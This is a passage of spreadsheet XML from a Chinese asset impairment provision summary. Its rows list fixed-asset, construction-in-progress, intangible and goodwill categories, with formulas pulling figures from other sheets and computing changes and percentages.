      <c r="A38" s="521" t="inlineStr">
        <is>
          <t>4-8-2</t>
        </is>
      </c>
      <c r="B38" s="185" t="inlineStr">
        <is>
          <t>固资构筑</t>
        </is>
      </c>
      <c r="C38" s="180" t="inlineStr">
        <is>
          <t xml:space="preserve">         构筑物及其他辅助设施</t>
        </is>
      </c>
      <c r="D38" s="629">
        <f>'4-8-2构筑物'!K33</f>
        <v/>
      </c>
      <c r="E38" s="629">
        <f>'4-8-3管道沟槽'!N33</f>
        <v/>
      </c>
      <c r="F38" s="627">
        <f>IF((E38-D38)=0,"",(E38-D38))</f>
        <v/>
      </c>
      <c r="G38" s="627">
        <f>IF(OR(D38=0,D38="",F38=""),"",F38/D38*100)</f>
        <v/>
      </c>
      <c r="H38" s="628" t="n"/>
      <c r="I38" s="389" t="n"/>
      <c r="J38" s="389" t="n"/>
      <c r="K38" s="389" t="n"/>
      <c r="L38" s="389" t="n"/>
      <c r="M38" s="389" t="n"/>
      <c r="N38" s="389" t="n"/>
      <c r="O38" s="389" t="n"/>
      <c r="P38" s="389" t="n"/>
      <c r="Q38" s="389" t="n"/>
      <c r="R38" s="389" t="n"/>
      <c r="S38" s="389" t="n"/>
      <c r="T38" s="389" t="n"/>
      <c r="U38" s="389" t="n"/>
      <c r="V38" s="389" t="n"/>
      <c r="W38" s="389" t="n"/>
      <c r="X38" s="389" t="n"/>
      <c r="Y38" s="389" t="n"/>
      <c r="Z38" s="389" t="n"/>
      <c r="AA38" s="389" t="n"/>
      <c r="AB38" s="389" t="n"/>
      <c r="AC38" s="389" t="n"/>
      <c r="AD38" s="389" t="n"/>
      <c r="AE38" s="389" t="n"/>
      <c r="AF38" s="389" t="n"/>
      <c r="AG38" s="389" t="n"/>
      <c r="AH38" s="389" t="n"/>
      <c r="AI38" s="389" t="n"/>
      <c r="AJ38" s="389" t="n"/>
      <c r="AK38" s="389" t="n"/>
      <c r="AL38" s="389" t="n"/>
      <c r="AM38" s="389" t="n"/>
      <c r="AN38" s="389" t="n"/>
      <c r="AO38" s="389" t="n"/>
      <c r="AP38" s="389" t="n"/>
      <c r="AQ38" s="389" t="n"/>
      <c r="AR38" s="389" t="n"/>
      <c r="AS38" s="389" t="n"/>
      <c r="AT38" s="389" t="n"/>
      <c r="AU38" s="389" t="n"/>
      <c r="AV38" s="389" t="n"/>
      <c r="AW38" s="389" t="n"/>
      <c r="AX38" s="389" t="n"/>
      <c r="AY38" s="389" t="n"/>
      <c r="AZ38" s="389" t="n"/>
      <c r="BA38" s="389" t="n"/>
      <c r="BB38" s="389" t="n"/>
      <c r="BC38" s="389" t="n"/>
      <c r="BD38" s="389" t="n"/>
      <c r="BE38" s="389" t="n"/>
      <c r="BF38" s="389" t="n"/>
    </row>
    <row r="39" ht="15" customHeight="1" s="415">
      <c r="A39" s="521" t="inlineStr">
        <is>
          <t>4-8-3</t>
        </is>
      </c>
      <c r="B39" s="185" t="inlineStr">
        <is>
          <t>固资管道</t>
        </is>
      </c>
      <c r="C39" s="180" t="inlineStr">
        <is>
          <t xml:space="preserve">         管道和沟槽</t>
        </is>
      </c>
      <c r="D39" s="629">
        <f>'4-8-3管道沟槽'!K33</f>
        <v/>
      </c>
      <c r="E39" s="629">
        <f>'4-8-3管道沟槽'!N33</f>
        <v/>
      </c>
      <c r="F39" s="627">
        <f>IF((E39-D39)=0,"",(E39-D39))</f>
        <v/>
      </c>
      <c r="G39" s="627">
        <f>IF(OR(D39=0,D39="",F39=""),"",F39/D39*100)</f>
        <v/>
      </c>
      <c r="H39" s="628" t="n"/>
      <c r="I39" s="389" t="n"/>
      <c r="J39" s="389" t="n"/>
      <c r="K39" s="389" t="n"/>
      <c r="L39" s="389" t="n"/>
      <c r="M39" s="389" t="n"/>
      <c r="N39" s="389" t="n"/>
      <c r="O39" s="389" t="n"/>
      <c r="P39" s="389" t="n"/>
      <c r="Q39" s="389" t="n"/>
      <c r="R39" s="389" t="n"/>
      <c r="S39" s="389" t="n"/>
      <c r="T39" s="389" t="n"/>
      <c r="U39" s="389" t="n"/>
      <c r="V39" s="389" t="n"/>
      <c r="W39" s="389" t="n"/>
      <c r="X39" s="389" t="n"/>
      <c r="Y39" s="389" t="n"/>
      <c r="Z39" s="389" t="n"/>
      <c r="AA39" s="389" t="n"/>
      <c r="AB39" s="389" t="n"/>
      <c r="AC39" s="389" t="n"/>
      <c r="AD39" s="389" t="n"/>
      <c r="AE39" s="389" t="n"/>
      <c r="AF39" s="389" t="n"/>
      <c r="AG39" s="389" t="n"/>
      <c r="AH39" s="389" t="n"/>
      <c r="AI39" s="389" t="n"/>
      <c r="AJ39" s="389" t="n"/>
      <c r="AK39" s="389" t="n"/>
      <c r="AL39" s="389" t="n"/>
      <c r="AM39" s="389" t="n"/>
      <c r="AN39" s="389" t="n"/>
      <c r="AO39" s="389" t="n"/>
      <c r="AP39" s="389" t="n"/>
      <c r="AQ39" s="389" t="n"/>
      <c r="AR39" s="389" t="n"/>
      <c r="AS39" s="389" t="n"/>
      <c r="AT39" s="389" t="n"/>
      <c r="AU39" s="389" t="n"/>
      <c r="AV39" s="389" t="n"/>
      <c r="AW39" s="389" t="n"/>
      <c r="AX39" s="389" t="n"/>
      <c r="AY39" s="389" t="n"/>
      <c r="AZ39" s="389" t="n"/>
      <c r="BA39" s="389" t="n"/>
      <c r="BB39" s="389" t="n"/>
      <c r="BC39" s="389" t="n"/>
      <c r="BD39" s="389" t="n"/>
      <c r="BE39" s="389" t="n"/>
      <c r="BF39" s="389" t="n"/>
    </row>
    <row r="40" ht="15" customHeight="1" s="415">
      <c r="A40" s="521" t="inlineStr">
        <is>
          <t>4-8-4</t>
        </is>
      </c>
      <c r="B40" s="185" t="inlineStr">
        <is>
          <t>固资机器</t>
        </is>
      </c>
      <c r="C40" s="180" t="inlineStr">
        <is>
          <t xml:space="preserve">         机器设备</t>
        </is>
      </c>
      <c r="D40" s="629">
        <f>'4-8-4机器设备'!L33</f>
        <v/>
      </c>
      <c r="E40" s="629">
        <f>'4-8-4机器设备'!O33</f>
        <v/>
      </c>
      <c r="F40" s="627">
        <f>IF((E40-D40)=0,"",(E40-D40))</f>
        <v/>
      </c>
      <c r="G40" s="627">
        <f>IF(OR(D40=0,D40="",F40=""),"",F40/D40*100)</f>
        <v/>
      </c>
      <c r="H40" s="628" t="n"/>
      <c r="I40" s="389" t="n"/>
      <c r="J40" s="389" t="n"/>
      <c r="K40" s="389" t="n"/>
      <c r="L40" s="389" t="n"/>
      <c r="M40" s="389" t="n"/>
      <c r="N40" s="389" t="n"/>
      <c r="O40" s="389" t="n"/>
      <c r="P40" s="389" t="n"/>
      <c r="Q40" s="389" t="n"/>
      <c r="R40" s="389" t="n"/>
      <c r="S40" s="389" t="n"/>
      <c r="T40" s="389" t="n"/>
      <c r="U40" s="389" t="n"/>
      <c r="V40" s="389" t="n"/>
      <c r="W40" s="389" t="n"/>
      <c r="X40" s="389" t="n"/>
      <c r="Y40" s="389" t="n"/>
      <c r="Z40" s="389" t="n"/>
      <c r="AA40" s="389" t="n"/>
      <c r="AB40" s="389" t="n"/>
      <c r="AC40" s="389" t="n"/>
      <c r="AD40" s="389" t="n"/>
      <c r="AE40" s="389" t="n"/>
      <c r="AF40" s="389" t="n"/>
      <c r="AG40" s="389" t="n"/>
      <c r="AH40" s="389" t="n"/>
      <c r="AI40" s="389" t="n"/>
      <c r="AJ40" s="389" t="n"/>
      <c r="AK40" s="389" t="n"/>
      <c r="AL40" s="389" t="n"/>
      <c r="AM40" s="389" t="n"/>
      <c r="AN40" s="389" t="n"/>
      <c r="AO40" s="389" t="n"/>
      <c r="AP40" s="389" t="n"/>
      <c r="AQ40" s="389" t="n"/>
      <c r="AR40" s="389" t="n"/>
      <c r="AS40" s="389" t="n"/>
      <c r="AT40" s="389" t="n"/>
      <c r="AU40" s="389" t="n"/>
      <c r="AV40" s="389" t="n"/>
      <c r="AW40" s="389" t="n"/>
      <c r="AX40" s="389" t="n"/>
      <c r="AY40" s="389" t="n"/>
      <c r="AZ40" s="389" t="n"/>
      <c r="BA40" s="389" t="n"/>
      <c r="BB40" s="389" t="n"/>
      <c r="BC40" s="389" t="n"/>
      <c r="BD40" s="389" t="n"/>
      <c r="BE40" s="389" t="n"/>
      <c r="BF40" s="389" t="n"/>
    </row>
    <row r="41" ht="15" customHeight="1" s="415">
      <c r="A41" s="521" t="inlineStr">
        <is>
          <t>4-8-5</t>
        </is>
      </c>
      <c r="B41" s="185" t="inlineStr">
        <is>
          <t>固资运输</t>
        </is>
      </c>
      <c r="C41" s="180" t="inlineStr">
        <is>
          <t xml:space="preserve">         运输设备</t>
        </is>
      </c>
      <c r="D41" s="629">
        <f>'4-8-5车辆'!L33</f>
        <v/>
      </c>
      <c r="E41" s="629">
        <f>'4-8-5车辆'!O33</f>
        <v/>
      </c>
      <c r="F41" s="627">
        <f>IF((E41-D41)=0,"",(E41-D41))</f>
        <v/>
      </c>
      <c r="G41" s="627">
        <f>IF(OR(D41=0,D41="",F41=""),"",F41/D41*100)</f>
        <v/>
      </c>
      <c r="H41" s="628" t="n"/>
      <c r="I41" s="389" t="n"/>
      <c r="J41" s="389" t="n"/>
      <c r="K41" s="389" t="n"/>
      <c r="L41" s="389" t="n"/>
      <c r="M41" s="389" t="n"/>
      <c r="N41" s="389" t="n"/>
      <c r="O41" s="389" t="n"/>
      <c r="P41" s="389" t="n"/>
      <c r="Q41" s="389" t="n"/>
      <c r="R41" s="389" t="n"/>
      <c r="S41" s="389" t="n"/>
      <c r="T41" s="389" t="n"/>
      <c r="U41" s="389" t="n"/>
      <c r="V41" s="389" t="n"/>
      <c r="W41" s="389" t="n"/>
      <c r="X41" s="389" t="n"/>
      <c r="Y41" s="389" t="n"/>
      <c r="Z41" s="389" t="n"/>
      <c r="AA41" s="389" t="n"/>
      <c r="AB41" s="389" t="n"/>
      <c r="AC41" s="389" t="n"/>
      <c r="AD41" s="389" t="n"/>
      <c r="AE41" s="389" t="n"/>
      <c r="AF41" s="389" t="n"/>
      <c r="AG41" s="389" t="n"/>
      <c r="AH41" s="389" t="n"/>
      <c r="AI41" s="389" t="n"/>
      <c r="AJ41" s="389" t="n"/>
      <c r="AK41" s="389" t="n"/>
      <c r="AL41" s="389" t="n"/>
      <c r="AM41" s="389" t="n"/>
      <c r="AN41" s="389" t="n"/>
      <c r="AO41" s="389" t="n"/>
      <c r="AP41" s="389" t="n"/>
      <c r="AQ41" s="389" t="n"/>
      <c r="AR41" s="389" t="n"/>
      <c r="AS41" s="389" t="n"/>
      <c r="AT41" s="389" t="n"/>
      <c r="AU41" s="389" t="n"/>
      <c r="AV41" s="389" t="n"/>
      <c r="AW41" s="389" t="n"/>
      <c r="AX41" s="389" t="n"/>
      <c r="AY41" s="389" t="n"/>
      <c r="AZ41" s="389" t="n"/>
      <c r="BA41" s="389" t="n"/>
      <c r="BB41" s="389" t="n"/>
      <c r="BC41" s="389" t="n"/>
      <c r="BD41" s="389" t="n"/>
      <c r="BE41" s="389" t="n"/>
      <c r="BF41" s="389" t="n"/>
    </row>
    <row r="42" ht="15" customHeight="1" s="415">
      <c r="A42" s="521" t="inlineStr">
        <is>
          <t>4-8-6</t>
        </is>
      </c>
      <c r="B42" s="185" t="inlineStr">
        <is>
          <t>固资电子</t>
        </is>
      </c>
      <c r="C42" s="180" t="inlineStr">
        <is>
          <t xml:space="preserve">         电子设备</t>
        </is>
      </c>
      <c r="D42" s="629">
        <f>'4-8-6电子设备'!L33</f>
        <v/>
      </c>
      <c r="E42" s="629">
        <f>'4-8-6电子设备'!O33</f>
        <v/>
      </c>
      <c r="F42" s="627">
        <f>IF((E42-D42)=0,"",(E42-D42))</f>
        <v/>
      </c>
      <c r="G42" s="627">
        <f>IF(OR(D42=0,D42="",F42=""),"",F42/D42*100)</f>
        <v/>
      </c>
      <c r="H42" s="628" t="n"/>
      <c r="I42" s="389" t="n"/>
      <c r="J42" s="389" t="n"/>
      <c r="K42" s="389" t="n"/>
      <c r="L42" s="389" t="n"/>
      <c r="M42" s="389" t="n"/>
      <c r="N42" s="389" t="n"/>
      <c r="O42" s="389" t="n"/>
      <c r="P42" s="389" t="n"/>
      <c r="Q42" s="389" t="n"/>
      <c r="R42" s="389" t="n"/>
      <c r="S42" s="389" t="n"/>
      <c r="T42" s="389" t="n"/>
      <c r="U42" s="389" t="n"/>
      <c r="V42" s="389" t="n"/>
      <c r="W42" s="389" t="n"/>
      <c r="X42" s="389" t="n"/>
      <c r="Y42" s="389" t="n"/>
      <c r="Z42" s="389" t="n"/>
      <c r="AA42" s="389" t="n"/>
      <c r="AB42" s="389" t="n"/>
      <c r="AC42" s="389" t="n"/>
      <c r="AD42" s="389" t="n"/>
      <c r="AE42" s="389" t="n"/>
      <c r="AF42" s="389" t="n"/>
      <c r="AG42" s="389" t="n"/>
      <c r="AH42" s="389" t="n"/>
      <c r="AI42" s="389" t="n"/>
      <c r="AJ42" s="389" t="n"/>
      <c r="AK42" s="389" t="n"/>
      <c r="AL42" s="389" t="n"/>
      <c r="AM42" s="389" t="n"/>
      <c r="AN42" s="389" t="n"/>
      <c r="AO42" s="389" t="n"/>
      <c r="AP42" s="389" t="n"/>
      <c r="AQ42" s="389" t="n"/>
      <c r="AR42" s="389" t="n"/>
      <c r="AS42" s="389" t="n"/>
      <c r="AT42" s="389" t="n"/>
      <c r="AU42" s="389" t="n"/>
      <c r="AV42" s="389" t="n"/>
      <c r="AW42" s="389" t="n"/>
      <c r="AX42" s="389" t="n"/>
      <c r="AY42" s="389" t="n"/>
      <c r="AZ42" s="389" t="n"/>
      <c r="BA42" s="389" t="n"/>
      <c r="BB42" s="389" t="n"/>
      <c r="BC42" s="389" t="n"/>
      <c r="BD42" s="389" t="n"/>
      <c r="BE42" s="389" t="n"/>
      <c r="BF42" s="389" t="n"/>
    </row>
    <row r="43" ht="15" customHeight="1" s="415">
      <c r="A43" s="521" t="inlineStr">
        <is>
          <t>4-9</t>
        </is>
      </c>
      <c r="B43" s="185" t="inlineStr">
        <is>
          <t>在建汇总</t>
        </is>
      </c>
      <c r="C43" s="180" t="inlineStr">
        <is>
          <t>九、在建工程减值准备合计</t>
        </is>
      </c>
      <c r="D43" s="627">
        <f>SUM(D44:D45)</f>
        <v/>
      </c>
      <c r="E43" s="627">
        <f>SUM(E44:E45)</f>
        <v/>
      </c>
      <c r="F43" s="627">
        <f>IF((E43-D43)=0,"",(E43-D43))</f>
        <v/>
      </c>
      <c r="G43" s="627">
        <f>IF(OR(D43=0,D43="",F43=""),"",F43/D43*100)</f>
        <v/>
      </c>
      <c r="H43" s="628" t="n"/>
      <c r="I43" s="389" t="n"/>
      <c r="J43" s="389" t="n"/>
      <c r="K43" s="389" t="n"/>
      <c r="L43" s="389" t="n"/>
      <c r="M43" s="389" t="n"/>
      <c r="N43" s="389" t="n"/>
      <c r="O43" s="389" t="n"/>
      <c r="P43" s="389" t="n"/>
      <c r="Q43" s="389" t="n"/>
      <c r="R43" s="389" t="n"/>
      <c r="S43" s="389" t="n"/>
      <c r="T43" s="389" t="n"/>
      <c r="U43" s="389" t="n"/>
      <c r="V43" s="389" t="n"/>
      <c r="W43" s="389" t="n"/>
      <c r="X43" s="389" t="n"/>
      <c r="Y43" s="389" t="n"/>
      <c r="Z43" s="389" t="n"/>
      <c r="AA43" s="389" t="n"/>
      <c r="AB43" s="389" t="n"/>
      <c r="AC43" s="389" t="n"/>
      <c r="AD43" s="389" t="n"/>
      <c r="AE43" s="389" t="n"/>
      <c r="AF43" s="389" t="n"/>
      <c r="AG43" s="389" t="n"/>
      <c r="AH43" s="389" t="n"/>
      <c r="AI43" s="389" t="n"/>
      <c r="AJ43" s="389" t="n"/>
      <c r="AK43" s="389" t="n"/>
      <c r="AL43" s="389" t="n"/>
      <c r="AM43" s="389" t="n"/>
      <c r="AN43" s="389" t="n"/>
      <c r="AO43" s="389" t="n"/>
      <c r="AP43" s="389" t="n"/>
      <c r="AQ43" s="389" t="n"/>
      <c r="AR43" s="389" t="n"/>
      <c r="AS43" s="389" t="n"/>
      <c r="AT43" s="389" t="n"/>
      <c r="AU43" s="389" t="n"/>
      <c r="AV43" s="389" t="n"/>
      <c r="AW43" s="389" t="n"/>
      <c r="AX43" s="389" t="n"/>
      <c r="AY43" s="389" t="n"/>
      <c r="AZ43" s="389" t="n"/>
      <c r="BA43" s="389" t="n"/>
      <c r="BB43" s="389" t="n"/>
      <c r="BC43" s="389" t="n"/>
      <c r="BD43" s="389" t="n"/>
      <c r="BE43" s="389" t="n"/>
      <c r="BF43" s="389" t="n"/>
    </row>
    <row r="44" ht="15" customHeight="1" s="415">
      <c r="A44" s="521" t="inlineStr">
        <is>
          <t>4-9-1</t>
        </is>
      </c>
      <c r="B44" s="185" t="inlineStr">
        <is>
          <t>在建土建</t>
        </is>
      </c>
      <c r="C44" s="180" t="inlineStr">
        <is>
          <t xml:space="preserve">    其中：在建土建工程</t>
        </is>
      </c>
      <c r="D44" s="629">
        <f>'4-9-1在建（土建）'!J28</f>
        <v/>
      </c>
      <c r="E44" s="629">
        <f>'4-9-1在建（土建）'!K28</f>
        <v/>
      </c>
      <c r="F44" s="627">
        <f>IF((E44-D44)=0,"",(E44-D44))</f>
        <v/>
      </c>
      <c r="G44" s="627">
        <f>IF(OR(D44=0,D44="",F44=""),"",F44/D44*100)</f>
        <v/>
      </c>
      <c r="H44" s="628" t="n"/>
      <c r="I44" s="389" t="n"/>
      <c r="J44" s="389" t="n"/>
      <c r="K44" s="389" t="n"/>
      <c r="L44" s="389" t="n"/>
      <c r="M44" s="389" t="n"/>
      <c r="N44" s="389" t="n"/>
      <c r="O44" s="389" t="n"/>
      <c r="P44" s="389" t="n"/>
      <c r="Q44" s="389" t="n"/>
      <c r="R44" s="389" t="n"/>
      <c r="S44" s="389" t="n"/>
      <c r="T44" s="389" t="n"/>
      <c r="U44" s="389" t="n"/>
      <c r="V44" s="389" t="n"/>
      <c r="W44" s="389" t="n"/>
      <c r="X44" s="389" t="n"/>
      <c r="Y44" s="389" t="n"/>
      <c r="Z44" s="389" t="n"/>
      <c r="AA44" s="389" t="n"/>
      <c r="AB44" s="389" t="n"/>
      <c r="AC44" s="389" t="n"/>
      <c r="AD44" s="389" t="n"/>
      <c r="AE44" s="389" t="n"/>
      <c r="AF44" s="389" t="n"/>
      <c r="AG44" s="389" t="n"/>
      <c r="AH44" s="389" t="n"/>
      <c r="AI44" s="389" t="n"/>
      <c r="AJ44" s="389" t="n"/>
      <c r="AK44" s="389" t="n"/>
      <c r="AL44" s="389" t="n"/>
      <c r="AM44" s="389" t="n"/>
      <c r="AN44" s="389" t="n"/>
      <c r="AO44" s="389" t="n"/>
      <c r="AP44" s="389" t="n"/>
      <c r="AQ44" s="389" t="n"/>
      <c r="AR44" s="389" t="n"/>
      <c r="AS44" s="389" t="n"/>
      <c r="AT44" s="389" t="n"/>
      <c r="AU44" s="389" t="n"/>
      <c r="AV44" s="389" t="n"/>
      <c r="AW44" s="389" t="n"/>
      <c r="AX44" s="389" t="n"/>
      <c r="AY44" s="389" t="n"/>
      <c r="AZ44" s="389" t="n"/>
      <c r="BA44" s="389" t="n"/>
      <c r="BB44" s="389" t="n"/>
      <c r="BC44" s="389" t="n"/>
      <c r="BD44" s="389" t="n"/>
      <c r="BE44" s="389" t="n"/>
      <c r="BF44" s="389" t="n"/>
    </row>
    <row r="45" ht="15" customHeight="1" s="415">
      <c r="A45" s="521" t="inlineStr">
        <is>
          <t>4-9-2</t>
        </is>
      </c>
      <c r="B45" s="185" t="inlineStr">
        <is>
          <t>在建安装</t>
        </is>
      </c>
      <c r="C45" s="180" t="inlineStr">
        <is>
          <t xml:space="preserve">         在建设备安装</t>
        </is>
      </c>
      <c r="D45" s="629">
        <f>'4-9-2在建（设备）'!L28</f>
        <v/>
      </c>
      <c r="E45" s="629">
        <f>'4-9-2在建（设备）'!P28</f>
        <v/>
      </c>
      <c r="F45" s="627">
        <f>IF((E45-D45)=0,"",(E45-D45))</f>
        <v/>
      </c>
      <c r="G45" s="627">
        <f>IF(OR(D45=0,D45="",F45=""),"",F45/D45*100)</f>
        <v/>
      </c>
      <c r="H45" s="628" t="n"/>
      <c r="I45" s="389" t="n"/>
      <c r="J45" s="389" t="n"/>
      <c r="K45" s="389" t="n"/>
      <c r="L45" s="389" t="n"/>
      <c r="M45" s="389" t="n"/>
      <c r="N45" s="389" t="n"/>
      <c r="O45" s="389" t="n"/>
      <c r="P45" s="389" t="n"/>
      <c r="Q45" s="389" t="n"/>
      <c r="R45" s="389" t="n"/>
      <c r="S45" s="389" t="n"/>
      <c r="T45" s="389" t="n"/>
      <c r="U45" s="389" t="n"/>
      <c r="V45" s="389" t="n"/>
      <c r="W45" s="389" t="n"/>
      <c r="X45" s="389" t="n"/>
      <c r="Y45" s="389" t="n"/>
      <c r="Z45" s="389" t="n"/>
      <c r="AA45" s="389" t="n"/>
      <c r="AB45" s="389" t="n"/>
      <c r="AC45" s="389" t="n"/>
      <c r="AD45" s="389" t="n"/>
      <c r="AE45" s="389" t="n"/>
      <c r="AF45" s="389" t="n"/>
      <c r="AG45" s="389" t="n"/>
      <c r="AH45" s="389" t="n"/>
      <c r="AI45" s="389" t="n"/>
      <c r="AJ45" s="389" t="n"/>
      <c r="AK45" s="389" t="n"/>
      <c r="AL45" s="389" t="n"/>
      <c r="AM45" s="389" t="n"/>
      <c r="AN45" s="389" t="n"/>
      <c r="AO45" s="389" t="n"/>
      <c r="AP45" s="389" t="n"/>
      <c r="AQ45" s="389" t="n"/>
      <c r="AR45" s="389" t="n"/>
      <c r="AS45" s="389" t="n"/>
      <c r="AT45" s="389" t="n"/>
      <c r="AU45" s="389" t="n"/>
      <c r="AV45" s="389" t="n"/>
      <c r="AW45" s="389" t="n"/>
      <c r="AX45" s="389" t="n"/>
      <c r="AY45" s="389" t="n"/>
      <c r="AZ45" s="389" t="n"/>
      <c r="BA45" s="389" t="n"/>
      <c r="BB45" s="389" t="n"/>
      <c r="BC45" s="389" t="n"/>
      <c r="BD45" s="389" t="n"/>
      <c r="BE45" s="389" t="n"/>
      <c r="BF45" s="389" t="n"/>
    </row>
    <row r="46" ht="15" customHeight="1" s="415">
      <c r="A46" s="521" t="inlineStr">
        <is>
          <t>4-9-3</t>
        </is>
      </c>
      <c r="B46" s="185" t="inlineStr">
        <is>
          <t>工程物资</t>
        </is>
      </c>
      <c r="C46" s="100" t="inlineStr">
        <is>
          <t xml:space="preserve">          工程物资减值准备</t>
        </is>
      </c>
      <c r="D46" s="629">
        <f>'4-9-3在建工程（工程物资）'!H28</f>
        <v/>
      </c>
      <c r="E46" s="629">
        <f>'4-9-3在建工程（工程物资）'!K28</f>
        <v/>
      </c>
      <c r="F46" s="627">
        <f>IF((E46-D46)=0,"",(E46-D46))</f>
        <v/>
      </c>
      <c r="G46" s="627">
        <f>IF(OR(D46=0,D46="",F46=""),"",F46/D46*100)</f>
        <v/>
      </c>
      <c r="H46" s="628" t="n"/>
    </row>
    <row r="47" ht="15" customHeight="1" s="415">
      <c r="A47" s="55" t="n">
        <v>28</v>
      </c>
      <c r="B47" s="185" t="inlineStr">
        <is>
          <t>生物资产</t>
        </is>
      </c>
      <c r="C47" s="180" t="inlineStr">
        <is>
          <t>十一、生产性生物资产减值准备</t>
        </is>
      </c>
      <c r="D47" s="629">
        <f>'4-10生产性生物资产'!I26</f>
        <v/>
      </c>
      <c r="E47" s="629">
        <f>'4-10生产性生物资产'!L26</f>
        <v/>
      </c>
      <c r="F47" s="627">
        <f>IF((E47-D47)=0,"",(E47-D47))</f>
        <v/>
      </c>
      <c r="G47" s="627">
        <f>IF(OR(D47=0,D47="",F47=""),"",F47/D47*100)</f>
        <v/>
      </c>
      <c r="H47" s="628" t="n"/>
    </row>
    <row r="48" ht="15" customHeight="1" s="415">
      <c r="A48" s="55" t="n">
        <v>29</v>
      </c>
      <c r="B48" s="185" t="inlineStr">
        <is>
          <t>油气资产</t>
        </is>
      </c>
      <c r="C48" s="180" t="inlineStr">
        <is>
          <t>十二、油气资产减值准备</t>
        </is>
      </c>
      <c r="D48" s="629">
        <f>'4-11油气资产'!J27</f>
        <v/>
      </c>
      <c r="E48" s="629">
        <f>'4-11油气资产'!M27</f>
        <v/>
      </c>
      <c r="F48" s="627">
        <f>IF((E48-D48)=0,"",(E48-D48))</f>
        <v/>
      </c>
      <c r="G48" s="627">
        <f>IF(OR(D48=0,D48="",F48=""),"",F48/D48*100)</f>
        <v/>
      </c>
      <c r="H48" s="628" t="n"/>
    </row>
    <row r="49" ht="15" customHeight="1" s="415">
      <c r="A49" s="521" t="inlineStr">
        <is>
          <t>4-13</t>
        </is>
      </c>
      <c r="B49" s="185" t="inlineStr">
        <is>
          <t>无形汇总</t>
        </is>
      </c>
      <c r="C49" s="180" t="inlineStr">
        <is>
          <t>十三、无形资产减值准备</t>
        </is>
      </c>
      <c r="D49" s="629">
        <f>SUM(D50:D52)</f>
        <v/>
      </c>
      <c r="E49" s="629">
        <f>SUM(E50:E52)</f>
        <v/>
      </c>
      <c r="F49" s="627">
        <f>IF((E49-D49)=0,"",(E49-D49))</f>
        <v/>
      </c>
      <c r="G49" s="627">
        <f>IF(OR(D49=0,D49="",F49=""),"",F49/D49*100)</f>
        <v/>
      </c>
      <c r="H49" s="628" t="n"/>
    </row>
    <row r="50" ht="15" customHeight="1" s="415">
      <c r="A50" s="521" t="inlineStr">
        <is>
          <t>4-13-1</t>
        </is>
      </c>
      <c r="B50" s="101" t="inlineStr">
        <is>
          <t>无形土地</t>
        </is>
      </c>
      <c r="C50" s="100" t="inlineStr">
        <is>
          <t>无形资产—土地使用权</t>
        </is>
      </c>
      <c r="D50" s="629">
        <f>'4-13-1无形-土地'!M29</f>
        <v/>
      </c>
      <c r="E50" s="629">
        <f>'4-13-1无形-土地'!N29</f>
        <v/>
      </c>
      <c r="F50" s="627">
        <f>IF((E50-D50)=0,"",(E50-D50))</f>
        <v/>
      </c>
      <c r="G50" s="627">
        <f>IF(OR(D50=0,D50="",F50=""),"",F50/D50*100)</f>
        <v/>
      </c>
      <c r="H50" s="628" t="n"/>
    </row>
    <row r="51" ht="15" customHeight="1" s="415">
      <c r="A51" s="521" t="inlineStr">
        <is>
          <t>4-13-2</t>
        </is>
      </c>
      <c r="B51" s="101" t="inlineStr">
        <is>
          <t>无形矿权</t>
        </is>
      </c>
      <c r="C51" s="100" t="inlineStr">
        <is>
          <t>无形资产—矿业权</t>
        </is>
      </c>
      <c r="D51" s="629">
        <f>'4-13-2无形-矿业权'!K29</f>
        <v/>
      </c>
      <c r="E51" s="629">
        <f>'4-13-2无形-矿业权'!L29</f>
        <v/>
      </c>
      <c r="F51" s="627">
        <f>IF((E51-D51)=0,"",(E51-D51))</f>
        <v/>
      </c>
      <c r="G51" s="627">
        <f>IF(OR(D51=0,D51="",F51=""),"",F51/D51*100)</f>
        <v/>
      </c>
      <c r="H51" s="628" t="n"/>
    </row>
    <row r="52" ht="15" customHeight="1" s="415">
      <c r="A52" s="521" t="inlineStr">
        <is>
          <t>4-13-3</t>
        </is>
      </c>
      <c r="B52" s="101" t="inlineStr">
        <is>
          <t>无形其他</t>
        </is>
      </c>
      <c r="C52" s="100" t="inlineStr">
        <is>
          <t>无形资产—其他无形资产</t>
        </is>
      </c>
      <c r="D52" s="629">
        <f>'4-13-3无形-其他'!G26</f>
        <v/>
      </c>
      <c r="E52" s="629">
        <f>'4-13-3无形-其他'!I26</f>
        <v/>
      </c>
      <c r="F52" s="627">
        <f>IF((E52-D52)=0,"",(E52-D52))</f>
        <v/>
      </c>
      <c r="G52" s="627">
        <f>IF(OR(D52=0,D52="",F52=""),"",F52/D52*100)</f>
        <v/>
      </c>
      <c r="H52" s="628" t="n"/>
    </row>
    <row r="53" ht="15" customHeight="1" s="415">
      <c r="A53" s="55" t="n">
        <v>31</v>
      </c>
      <c r="B53" s="185" t="inlineStr">
        <is>
          <t>商誉资产</t>
        </is>
      </c>
      <c r="C53" s="180" t="inlineStr">
        <is>
          <t>十四、商誉减值准备</t>
        </is>
      </c>
      <c r="D53" s="629">
        <f>'4-15商誉'!E25</f>
        <v/>
      </c>
      <c r="E53" s="629">
        <f>'4-15商誉'!F25</f>
        <v/>
      </c>
      <c r="F53" s="627">
        <f>IF((E53-D53)=0,"",(E53-D53))</f>
        <v/>
      </c>
      <c r="G53" s="627">
        <f>IF(OR(D53=0,D53="",F53=""),"",F53/D53*100)</f>
        <v/>
      </c>
      <c r="H53" s="628" t="n"/>
    </row>
    <row r="54" ht="15" customHeight="1" s="415">
      <c r="A54" s="55" t="n"/>
      <c r="B54" s="185" t="n"/>
      <c r="C54" s="180" t="n"/>
      <c r="D54" s="627" t="n"/>
      <c r="E54" s="627" t="n"/>
      <c r="F54" s="627" t="n"/>
      <c r="G54" s="627">
        <f>IF(OR(D54=0,D54="",F54=""),"",F54/D54*100)</f>
        <v/>
      </c>
      <c r="H54" s="628" t="n"/>
    </row>
    <row r="55" ht="15" customHeight="1" s="415">
      <c r="A55" s="55" t="n"/>
      <c r="B55" s="185" t="n"/>
      <c r="C55" s="180" t="n"/>
      <c r="D55" s="629" t="n"/>
      <c r="E55" s="629" t="n"/>
      <c r="F55" s="627" t="n"/>
      <c r="G55" s="627" t="n"/>
      <c r="H55" s="628" t="n"/>
    </row>
    <row r="56" ht="15" customHeight="1" s="415">
      <c r="A56" s="55" t="n"/>
      <c r="B56" s="185" t="n"/>
      <c r="C56" s="180" t="n"/>
      <c r="D56" s="629" t="n"/>
      <c r="E56" s="629" t="n"/>
      <c r="F56" s="627" t="n"/>
      <c r="G56" s="627" t="n"/>
      <c r="H56" s="628" t="n"/>
    </row>
    <row r="57" ht="15" customHeight="1" s="415">
